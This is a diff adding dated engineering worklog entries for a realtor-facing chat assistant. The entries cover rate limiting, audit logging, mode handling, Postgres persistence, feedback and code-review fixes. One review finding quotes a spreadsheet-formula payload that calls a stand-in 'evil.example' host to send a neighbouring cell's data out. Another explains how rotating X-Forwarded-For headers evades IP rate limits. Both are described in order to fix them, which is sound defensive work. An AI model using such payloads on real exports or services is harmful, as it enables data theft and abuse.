@@ -13,6 +13,366 @@ formatting.
 
 ---
 
+## 2026-08-25 — Hardening, mode, and the 4b surfaces
+
+**What.** AUR-20, 21, 38, 50, 57, 62, and the handoff docs 86/87/89/90/91/92/93.
+Rate limiting and audit logging, the mode round trip, a chats panel, an admin
+reports screen.
+
+**The rate limit counts in memory, per process, and that is the whole cost.**
+A second replica doubles every ceiling because neither knows about the other's
+count. Redis for twenty realtors is a service to run, monitor and pay for in
+order to make a number exact that only has to be roughly right. Written into
+operations.md §2 rather than left as a surprise; revisit it the day a second
+replica exists, not before.
+
+**60 questions an hour, per user, chosen not derived.** The sizing input the
+architecture doc wanted — the Apps Script tier — is still unconfirmed, and
+waiting for it meant shipping nothing. A realtor working hard asks ten in an
+hour; a client stuck in a retry loop trips this in about a minute. `/login` and
+`/doctor` are limited by IP instead: the first is unauthenticated and proxies
+passwords to the portal's own lockout, and the second deliberately answers
+callers whose token did not verify.
+
+**A per-user concurrency cap was considered and dropped.** Sixty simultaneous
+streams trip the hourly window on the same second, so it would buy nothing for
+the state it costs.
+
+**Audit goes to stdout, not a table.** architecture.md §2 scoped an `audit`
+table alongside conversations and feedback. Rejected: it is a second write on
+the answer path, and it trades Railway's retention for a retention problem of
+our own. The line is emitted in the `finally` that already exists, so a
+cancelled request still leaves one — with `status:"incomplete"`, which is the
+honest word for it, because cancellation raises past every `except Exception`.
+
+**The question is logged and the answer never is.** A question is
+realtor-authored and cannot contain sheet data. An answer in Realtor Mode can
+quote commission. This is the rule feedback.py already stated, applied to the
+bigger surface, and it is why an audit *table* would not have helped either.
+
+**The audit line reads the event stream, like persistence does.** Tool names,
+their result counts and the token usage all pass through `chat.py` already, so
+`agent_pydantic.py` is untouched for the second phase running. Reaching into the
+adapter for the same numbers would couple the route to the agent framework.
+
+**`owns()` became `meta()`.** Once the write path needed the stored mode as well
+as ownership (AUR-57), keeping a boolean beside it meant two queries for one
+answer. `meta()` returns the head row or `None`, and `None` still means both
+"not yours" and "never existed" at once, which was the point of `owns()`.
+
+**Reopening a thread sets the mode; it does not read it for redaction.**
+`body.mode` still selects the `Viewer`, because mode is what is on the screen
+right now — a realtor holding the phone toward a buyer is in Client Mode
+whatever the thread was. What the stored mode does is repaint the header before
+a single turn renders, so nobody watches a client conversation come back blue
+and switch a moment later. A thread continued in a different mode updates its
+row, or the list badges it wrongly.
+
+**`history()` now returns the message id and `created_at`.** Not for the model —
+`turns_from` still builds `Turn(role, content)` and nothing else — but
+`auraFeedbackRow` refuses to offer a vote it cannot attribute, so without an id
+every reopened answer silently lost its thumbs. Found by opening a seeded thread
+and counting buttons, not by reading the code.
+
+**`#auraNew` became the chats button, and New Chat moved inside the panel.** The
+header had four controls and a fifth is crowded at 375px. The panel lives inside
+`#aura` rather than on a route, because the router's only chat hook is
+`closeChat()` — a routed panel would have closed the chat in order to show the
+list of chats.
+
+**A reopened answer shows text and no cards.** The store keeps the ids and names
+an answer used, never the project records — architecture.md forbids a second
+copy. Rebuilding cards from those ids would be fine for 145 projects and would
+show a *different project's price* for the 16 that share a slug
+(known-issues 5). Cards come back when `PROJECT ID` is filled.
+
+**AUR-62 is a screen plus a CSV, and the gate is server-side.** The PWA throws
+the role away at login and now asks Aura's `/me` instead of starting to store
+one — a role in `localStorage` is a role somebody can edit. The client flag only
+decides whether to draw the nav row; `claims.is_admin` on `/feedback` decides
+whether the data exists.
+
+**Report timestamps render relative, not raw.** `created_at` is UTC out of
+Postgres, so printing it verbatim dated every report four hours into a Toronto
+reader's future. Caught on screen, not in a test.
+
+**The fully-local dev stack cannot hold a session, and now says so.**
+`dev/authshim.mjs` answers `login` and `session` locally while every other action
+proxies to the live deployment, which has never seen a dev token — so the first
+data screen returns `login required` and `isAuthErr` signs you out a second after
+you sign in. Confirmed against a stashed tree that it predates this work. It is
+fine for the chat, the panel and the reports screen; anything touching portal
+data needs a real Portal ID. Written into operations.md §3 rather than
+rediscovered.
+
+**A stale Client header survived a sign-out, and that is the dangerous
+direction.** `forgetData()` reset `AURA_MODE` to realtor and never repainted, so
+on a shared phone the next realtor signed in to an ochre "Client mode" header
+while the mode was actually realtor -- they would turn the screen toward a buyer
+believing the safe mode was on, with commission still reaching it. Pre-existing,
+not introduced here, and found by reloading the page during the mode work rather
+than by reading the code. One line, plus the check that fails without it.
+
+### Five from the review of this change, all reproduced before being fixed
+
+**The CSV export wrote realtor text as live spreadsheet formulas.** A note of
+`=HYPERLINK("https://evil.example/?x"&A1,"click")` came back out of
+`/feedback.csv` unchanged, and this file exists to be pasted into Sheets — so
+the reviewer gets a clickable link whose URL carries the neighbouring cell, and
+`=IMPORTXML` needs no click at all. Every cell that would lead with `=+-@` now
+gets a single quote, which spreadsheets consume on display.
+
+**The IP ceilings were keyed on a header the caller writes.** `client_ip` took
+the *first* `X-Forwarded-For` entry. Measured against a ceiling of three: six
+requests from one address gave three 429s, and twenty with a rotated header gave
+none. Railway appends the real peer, so the last entry is ours and the first is
+the caller's — it now reads the last. That assumes exactly one trusted hop,
+which is written into operations.md, because with the container exposed directly
+the whole header is caller-controlled again.
+
+**`MAX_KEYS` bounded nothing.** `_prune` only dropped expired entries, so during
+a burst of distinct live callers there was nothing expired to drop and the map
+grew past the cap unchecked — 15,000 keys against a stated 10,000, proven.
+`auth_portal_hmac` already had the oldest-first eviction this was missing; it now
+does too. Evicting forgives a request, never refuses one, so it is always safe.
+
+**`Retry-After` was not exposed, so the message it feeds never appeared.**
+Cross-origin JS sees only the CORS safelist. The page could read exactly
+`content-length, content-type, x-request-id`, so `r.headers.get('Retry-After')`
+was null every time and the "try again in about N minutes" branch was dead code —
+a realtor refused for the next hour was told "in a moment", every time. Also a
+lesson about the check that guarded it: `dev/verify.mjs` asserted the wait "is
+what the realtor is told", and that had never been true.
+
+**A failed `set_mode` cost the whole conversation.** AUR-57 put the first *write*
+on a path that had only ever read. Any error there escaped into the handler that
+turns store failures into `cid = None`, so `start` carried a null
+conversation_id, the client dropped the id it held, and the next question opened
+a second thread with none of the context — from a transient lock wait. It is
+guarded on its own now: a stale `mode` column costs one wrong badge in a list,
+which is the cheaper failure by a wide margin.
+
+**The `history` fallback was unreachable, and the worklog said otherwise.**
+`_history` returned the stored turns unconditionally, but a conversation created
+one line earlier is empty -- so with a store wired, `body.history` was dead code.
+An un-updated phone, which never sends a `conversation_id`, got a fresh
+conversation and zero context per question and a junk row each time; and after a
+store blip the shipped client kept a thread on screen the model could not see,
+because it had cleared `AURA_CID` but not its turns. `or body.history` restores
+the documented behaviour: the store wins when it has anything, the phone's
+assertion is honoured only for a thread the server has nothing for.
+
+**One of these fixes broke one of my own tests, and the test was the thing that
+was wrong.** `test_the_forwarded_address_wins_over_the_proxy` asserted the first
+XFF entry wins — it pinned the bug. Rewritten to say the opposite and to say why.
+The route-level version also had to model the proxy appending, because without
+one in front the header is fully caller-controlled either way, and a test that
+ignored that would have "proved" a fix that does not hold.
+
+**Two of this change's own checks were vacuous and were caught.** `dev/verify.mjs`
+matched the first line mentioning `403`, which was the comment above the code,
+so it passed for any implementation; and an `indexOf < indexOf` ordering check is
+true when the first term is absent. Both now fail when the thing they guard is
+broken, proved by breaking it. This is the second time the same trap has been
+hit — a check that has never been seen to fail has not been seen to work.
+
+---
+
+## 2026-08-25 — Phase 4a: the service gets a memory
+
+**What.** AUR-36, 37, 39, 40, 88 and the storage half of 61. Conversations,
+messages and feedback in Postgres; history moves from the client asserting what
+was said to the server knowing. The 4b surfaces — history panel, admin browser —
+are deliberately not in this.
+
+**Railway Postgres, not the Supabase the architecture doc names.** Same platform
+as the service, so it connects over Railway's private network and is never
+publicly reachable, and there is no cold start. architecture.md listed
+"Supabase free tier pauses after ~7 days idle" as a known risk against itself;
+this removes it rather than mitigating it. Cost: pgvector for Phase 5 needs
+installing rather than being present.
+
+**`schema.sql` at startup, no Alembic.** Three tables in a sprint did not justify
+a dependency and a generate-then-review step. The cost is real and will be felt
+later: no rollback, and every future change is hand-written. Adopting Alembic
+later is easy; removing it would not be.
+
+**Storage was measured, not assumed.** Mean question 37 bytes, mean answer 170,
+across the 50-question benchmark. Twenty realtors at five conversations a day is
+~30 MB/year against a tier that holds 500 MB. The instinct that transcripts grow
+fast is right for embeddings and images and wrong for terse text.
+
+**`sources` is the reason this phase exists.** Follow-ups were failing because
+history reaches the model as prose: it knew a previous answer named "Ivy Rogue
+and New Kleinburg" and had no idea what their ids were, so asked to compare them
+it invented `oakville-townhomes-1`. `ai_messages.sources` stores the ids and
+names an answer was built from, and `domain.conversation.turns_from` appends them
+as one line when rebuilding history. Names travel with the ids because the model
+matches on what it wrote, not on an id it never saw.
+
+**Persistence observes the event stream; the agent adapter is untouched.**
+`chat.py` already relays every event, so it accumulates the answer from `text`
+events and the ids from `projects` and writes one row at the end. The
+alternative — reaching into `Deps.collected` — would have coupled the route to
+the agent framework for no gain.
+
+**The assistant turn is written in a `finally`.** A realtor who taps Stop, or a
+phone that loses signal, reopens the thread to a half answer rather than a
+question with nothing under it.
+
+**Persistence is the feature that degrades.** A database that is down costs
+history, never the answer: `chat.py` falls back to the client's own turns and
+logs a warning, `/conversations` answers 503 rather than 500, and feedback still
+reaches the log line. `/health` stays up throughout — that behaviour was already
+pinned by `BrokenStore` / `ExplodingStore` in test_health.py, written phases ago.
+
+**Two integration scripts, deliberately not pytest.** `scripts/check_store.py`
+and `scripts/check_chat_persistence.py` need a real database and are run by hand.
+A test that silently skips when Postgres is absent is a test nobody notices has
+stopped running, and the suite's "never touches the network" rule is worth more
+than the coverage. They caught two things the fakes could not: `FakeAuthVerifier`
+answers the same user for any token, so an isolation check written as a token
+swap proves nothing — the row has to genuinely belong to somebody else. And the
+first versions used fixed user names, so a re-run failed against correct code;
+both now mint unique users per run.
+
+**`history` in the request body is kept, for now.** Honoured only when there is
+no `conversation_id`, so a phone that has not updated keeps working. The client
+sends `[]` once the server owns the thread. Remove the field when the rollout
+completes.
+
+**`rename` was planned onto the port and dropped.** Titles derive from the first
+question, so nothing would have called it.
+
+---
+
+## 2026-08-25 — Review of the feedback change: six fixes, two that mattered
+
+**What.** A review of the change above, on the code written the same day. Six
+findings, all fixed. Four are worth recording.
+
+**A capped list is not a capped field.** `project_ids` had
+`Field(max_length=MAX_PROJECT_IDS)`, which bounds how *many* ids arrive and says
+nothing about how long each is. Twelve ids of 200kB each is a valid body, and it
+produced a **2.3MB single log line behind a 200**. Every neighbouring field was
+capped and the docstring claimed the whole model was bounded, which is how it
+went unnoticed. It matters more than an oversized line usually would: until
+Phase 4 that log **is** the storage, so one request can push other realtors'
+reports out of a bounded retention window. Fixed with an `Annotated[str,
+StringConstraints]` item type. The lesson generalises — every list field in this
+service needs both bounds.
+
+**A data issue is not a thumbs-down.** Both exits from the category sheet
+hardcoded `verdict:'down'`, so reporting a stale price through its own button
+filed a negative vote the realtor never cast. AUR-59 measures whether the
+*answer* was good; AUR-60 reports whether the *sheet* is current, and a
+well-written, well-sourced answer can quote a price the sheet got wrong. Filing
+every AUR-60 report as an AUR-59 downvote would have made the helpfulness metric
+untrustworthy from the first week, and unrecoverably so — the two are
+indistinguishable once written. `verdict` is now nullable, `sheet(verdict)`
+files what it was opened with, and a `model_validator` refuses a report carrying
+neither verdict, category nor note, because optional on both does not mean
+optional on neither.
+
+**Skip discarded the note.** It sat directly under the note field, read as "skip
+the category", and sent `''`. That is the only free text a realtor can send, and
+it is worth most in exactly the case where none of the seven categories fitted.
+Skip now carries the note; a note alone enables Send; and on the report path,
+where there is no vote to preserve, the button cancels and says "Cancel" rather
+than filing something.
+
+**A comment that was wrong is worse than no comment.** The feedback buttons were
+36px under a comment asserting they were "comfortably over the 44px tap target
+once the row's own gap is counted" — 36+6 is 42, and a flex gap is not tappable.
+Two 36px thumbs 6px apart, and a mis-tap is unretractable: the verdict posts and
+the row settles to "Thanks" with no undo. Now 44x44, matching the five other
+places in this stylesheet that already use 2.75rem.
+
+**Two checks that could not fail.** The cap check grepped for the literals `500`
+and `200` while its message claimed parity with the server, so tightening
+`MAX_QUESTION` would have left the client posting into a 422 with the check
+green; it now reads both constants out of `feedback.py`. And the new
+mode-flip ordering check used `indexOf(a) < indexOf(b)`, which is true when `a`
+is absent — it passed on the reverted code. Both were caught by deliberately
+breaking the thing each claimed to protect and confirming the check went red.
+Worth doing for every check that guards something expensive.
+
+---
+
+## 2026-08-25 — Cards finished, feedback shipped without a database
+
+**What.** AUR-46 (deposit and incentive on the card) and AUR-59/AUR-60 plus the
+backend half of AUR-61 (thumbs and a data-issue report). Compare-by-name was
+looked at, understood and deliberately not fixed.
+
+**Deposit and incentives are visible to a buyer, and that is the requirement.**
+The natural instinct is to hide anything commercial in Client Mode, so it is
+worth recording that AUR-55 enumerates what Client Mode strips — commission,
+internal commission, internal remarks, allocation info, agent notes, admin
+notes, lead/client notes, confidential strategy, private builder information —
+and a deposit structure is on none of those lists. It is what the buyer is
+quoted, and "Best Incentives" is one of the four starter prompts. A test asserts
+they survive Client Mode, so reversing this has to be a decision rather than an
+accident.
+
+**The payload spells them the sheet's way.** `depositpct`, `depositsched`,
+`incentives` — `getCity_` in Sheets.js, not `deposit_pct` on the domain model.
+That is the entire point of `_for_client` existing beside `_for_model`: one
+`projectCard()` renders a city row and a chat result, and a domain-style key
+would need a translation layer that does not exist. The percentage arrives as a
+number from here and as text from the portal, so `pct()` formats whichever it is
+given and passes anything that is not a bare number through unchanged — a cell
+holding "$50k then 5% at closing" must not be rewritten into "50%".
+
+**`last_updated` reaches the client and is deliberately not rendered.** It was in
+the plan and came out. Ten of the 23 dated projects are read wrong today (the
+sheet is month-first, the parser tries day-first — known-issues 1), so a "records
+updated" line would be a confident wrong date on nearly half of them. Same
+reasoning that keeps "What changed this week?" out of the starter prompts. Render
+it in the change that fixes the parser.
+
+**Feedback stores the question and the verdict, and not the answer.** The first
+shape had the answer in the payload so the reviewer could see what Aura said. It
+came out: in Realtor Mode an answer can quote commission and internal notes, and
+until Phase 4 the store is a log line on a hosting platform — not a place that
+data has been agreed to live. The cost is real and worth naming: a bare thumbs-
+down now tells Sudhanshu a question was answered badly but not how, and only the
+categorised reports are actionable alone. Phase 4 recovers it for nothing, since
+`ai_messages` will hold the answer and `answer_id` already joins to it.
+
+**`mode` was dropped from the payload after being planned in.** The row does not
+render in Client Mode, so the field would have been the constant `"realtor"` on
+every row — a column that only ever holds one value teaches a reader something
+untrue about what was collected.
+
+**No `record_feedback` on the ConversationStore port.** Tempting, since the port
+is already declared for Phase 4. Rejected: the port's shape is not settled,
+nothing would call the method, and a `if store is not None` branch around an
+adapter that does not exist is an untested seam. Instead `_record()` in
+`app/feedback.py` is one function whose body is the whole of what Phase 4
+replaces.
+
+**The log line did not appear, and the endpoint still answered 200.** Found by
+posting a real report at a locally running uvicorn and finding nothing in the
+output. uvicorn configures the `uvicorn*` loggers and nothing else, so `aura.*`
+propagated to a handler-less root and `logging.lastResort` dropped it — that
+handler only emits WARNING and above. Harmless for most INFO; not harmless when
+the log line **is** the storage. `main.configure_logging()` now gives `aura` its
+own stdout handler. The regression test asserts through captured stdout rather
+than `caplog`, because `caplog` attaches a handler and is exactly what hid this.
+
+**Compare-by-name: understood, extended in known-issues, not fixed.** Two
+benchmark failures with two different causes, and the second one was not written
+down. Q09 is the documented signature gap. Q35 ("compare the first two") is not:
+history carries no ids, so the model invented `oakville-townhomes-1`. A name
+resolver cannot fix that — there is no name to resolve. It is Phase 4 work, and
+the interim (client sends ids back) was rejected as work Phase 4 deletes. Also
+recorded there: the ambiguity everyone reaches for first is not the cause, and
+the real ambiguity (issue 5) is same-name-in-the-*same*-city, so carrying the
+city forward would not disambiguate it either.
+
+---
+
 ## 2026-08-25 — Code review: nine fixes, one of them a Client Mode leak
 
 **What.** A high-effort review of the whole chat changeset. Nine findings, all
